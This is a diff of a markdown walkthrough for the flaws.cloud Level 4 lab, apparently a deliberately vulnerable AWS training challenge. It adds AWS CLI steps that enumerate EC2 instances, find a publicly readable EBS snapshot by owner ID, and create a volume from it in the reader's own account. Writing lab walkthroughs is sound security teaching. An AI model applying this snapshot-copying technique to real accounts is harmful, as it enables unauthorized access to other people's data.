@@ -476,6 +476,8 @@ Default output format [None]:
 ### Level 4:
 Visit: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
 
+Use the AWS key from the previous **level 3**: `aws sts get-caller-identity --profile level3`
+
 ```
 ┌─[cwl@RedCloud]─[~/Desktop/level3]
 └──╼ $aws ec2 describe-instances --profile level3 | jq -r '.Reservations[].Instances[] | {VolumeId: (.BlockDeviceMappings[].Ebs.VolumeId), PublicIp: .PublicIpAddress}'
@@ -487,9 +489,11 @@ Visit: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
 
 ![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/7ec5e16c-e844-4908-8846-78b49980e532)
 
+**Note:** **--owner-id** means **Account** from `aws sts get-caller-identity --profile level3`. **Notice** all the snapshots that are publicy readable without the owner-id.
+
 ```
 ┌─[✗]─[cwl@RedCloud]─[~/Desktop/level3]
-└──╼ $aws ec2 describe-snapshots --filters "Name=volume-id, Values=vol-04f1c039bc13ea950" --profile level3
+└──╼ $aws ec2 describe-snapshots --filters "Name=volume-id, Values=vol-04f1c039bc13ea950" --profile level3 --owner-id 975426262029
 {
     "Snapshots": [
         {
@@ -535,7 +539,7 @@ Anyone can create a volume based on this snapshot:
 
 ```
 ┌─[cwl@RedCloud]─[~/Desktop/level3]
-└──╼ $aws ec2 create-volume --region us-west-2 --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89
+└──╼ $aws ec2 create-volume --region us-west-2 --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89 --profile level3
 {
     "AvailabilityZone": "us-west-2a",
     "CreateTime": "2024-06-04T11:30:43.000Z",
@@ -580,7 +584,7 @@ Anyone can create a volume based on this snapshot:
 
 Login https://console.aws.amazon.com/ with **your credentials on your aws cli**.
 
-Create ec2 vm ubuntu instance with ssh .pem file on **your aws account**, and ssh into ubuntu from **your attack machine**:
+Create ec2 vm ubuntu instance or whatever you want linux distros with ssh .pem file on **your aws account**, and ssh into ubuntu from **your attack machine**:
 
 **EC2 Dashboard** ---> **Launch instance** ---> Follow the next steps in the below screenshots:
 
@@ -590,9 +594,11 @@ Create ec2 vm ubuntu instance with ssh .pem file on **your aws account**, and ss
 
 ![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/9b36f54e-173f-4ce9-a2e9-81a5f5f2ea04)
 
-View instances **--->** choose instance **--->** click connect at the top **--->** follow instructions to SSH into the machine.
+**View instances ---> choose instance ---> click connect at the top ---> follow instructions to SSH into the machine.**
 
 ![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/bda0dd5e-b311-4ed2-916b-e619a763d92f)
+
+On your aws cloudshell on your aws account, run the following commands:
 
 ```
 [cloudshell-user@ip-10-xxx-xx-xxx ~]$ aws ec2 describe-instances | jq -r '.Reservations[].Instances[].InstanceId'
